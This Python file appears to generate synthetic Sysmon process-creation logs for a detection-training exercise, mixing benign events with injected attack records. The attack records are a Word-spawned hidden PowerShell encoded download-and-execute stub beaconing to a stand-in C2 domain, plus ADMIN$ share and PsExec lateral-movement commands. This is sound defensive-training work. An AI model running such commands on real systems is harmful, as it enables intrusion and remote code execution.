"""
Synthetic process-creation log generator.

Modeled on Sysmon Event ID 1 (Process Create) fields. Supports injecting a
phishing-delivered execution chain (Office app spawning PowerShell with an
encoded command) and a lateral-movement command (admin share / PsExec-style
execution against a second host).
"""
import random
from datetime import datetime, timedelta
from typing import Optional

from app.core.config import COMMON_USERNAMES

BENIGN_PROCESS_TREES = [
    ("explorer.exe", "chrome.exe", 'chrome.exe'),
    ("explorer.exe", "OUTLOOK.EXE", 'OUTLOOK.EXE'),
    ("explorer.exe", "Teams.exe", 'Teams.exe'),
    ("services.exe", "svchost.exe", 'svchost.exe -k netsvcs'),
    ("explorer.exe", "notepad.exe", 'notepad.exe C:\\Users\\%u\\Desktop\\notes.txt'),
]


class ProcessLogGenerator:
    def __init__(self, seed: int, base_time: Optional[datetime] = None, hostname: str = "ws-fin-014"):
        self.rng = random.Random(seed)
        self.base_time = base_time or datetime(2026, 6, 18, 0, 0, 0)
        self.hostname = hostname
        self.entries: list[dict] = []
        self._guid_counter = 1

    def _guid(self) -> str:
        g = f"{{proc-guid-{self._guid_counter:06d}}}"
        self._guid_counter += 1
        return g

    def add_event(self, timestamp: datetime, host: str, parent_image: str, image: str,
                   command_line: str, user: str, is_attack: bool = False):
        entry = {
            "timestamp": timestamp.isoformat(),
            "host": host,
            "source": "sysmon",
            "process_guid": self._guid(),
            "parent_image": parent_image,
            "image": image,
            "command_line": command_line,
            "user": user,
            "is_attack": is_attack,
        }
        self.entries.append(entry)
        return entry

    def generate_benign_traffic(self, count: int, time_window_hours: int = 24):
        for _ in range(count):
            ts = self.base_time + timedelta(seconds=self.rng.randint(0, time_window_hours * 3600))
            user = self.rng.choice(COMMON_USERNAMES[:10])
            parent, image, cmdline = self.rng.choice(BENIGN_PROCESS_TREES)
            cmdline = cmdline.replace("%u", user)
            self.add_event(ts, self.hostname, parent, image, cmdline, user)

    def inject_phishing_execution_chain(self, victim_user: str, start_time: datetime,
                                          c2_domain: str = "x7f3k9-updates.duckdns.org"):
        """
        Office macro -> PowerShell with base64-encoded command (downloads
        and executes a stager), simulating a phishing-delivered initial
        access + execution chain.
        """
        t = start_time
        self.add_event(
            t, self.hostname, "explorer.exe", "WINWORD.EXE",
            "WINWORD.EXE /n \"C:\\Users\\Public\\Downloads\\Invoice_4471.docm\"",
            victim_user, is_attack=True,
        )
        t += timedelta(seconds=self.rng.uniform(8, 20))
        encoded_cmd = (
            "powershell.exe -nop -w hidden -enc "
            "SQBFAFgAIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAIABOAGUAdAAuAFcAZQBiAEMA"
        )
        self.add_event(
            t, self.hostname, "WINWORD.EXE", "powershell.exe",
            f"{encoded_cmd} # beacon:{c2_domain}",
            victim_user, is_attack=True,
        )
        return t

    def inject_lateral_movement(self, victim_user: str, start_time: datetime,
                                  target_host: str = "fileserver02", target_ip: str = "10.42.9.50"):
        """
        Simulate lateral movement via an admin-share / PsExec-style command
        from the already-compromised host against a second internal host.
        """
        t = start_time
        self.add_event(
            t, self.hostname, "powershell.exe", "net.exe",
            f"net.exe use \\\\{target_host}\\ADMIN$ /user:{victim_user}",
            victim_user, is_attack=True,
        )
        t += timedelta(seconds=self.rng.uniform(3, 9))
        self.add_event(
            t, self.hostname, "powershell.exe", "PsExec.exe",
            f"PsExec.exe \\\\{target_host} -accepteula -s cmd.exe /c whoami",
            victim_user, is_attack=True,
        )
        return t, target_host, target_ip

    def sorted_entries(self):
        return sorted(self.entries, key=lambda e: e["timestamp"])

    def render_text(self) -> str:
        lines = []
        for e in self.sorted_entries():
            ts = datetime.fromisoformat(e["timestamp"]).strftime("%Y-%m-%d %H:%M:%S")
            lines.append(
                f"[{ts}] {e['host']} ProcessCreate: ParentImage={e['parent_image']} "
                f"Image={e['image']} User={e['user']} CommandLine=\"{e['command_line']}\""
            )
        return "\n".join(lines)

    def player_view(self) -> list[dict]:
        return [{k: v for k, v in e.items() if k != "is_attack"} for e in self.sorted_entries()]
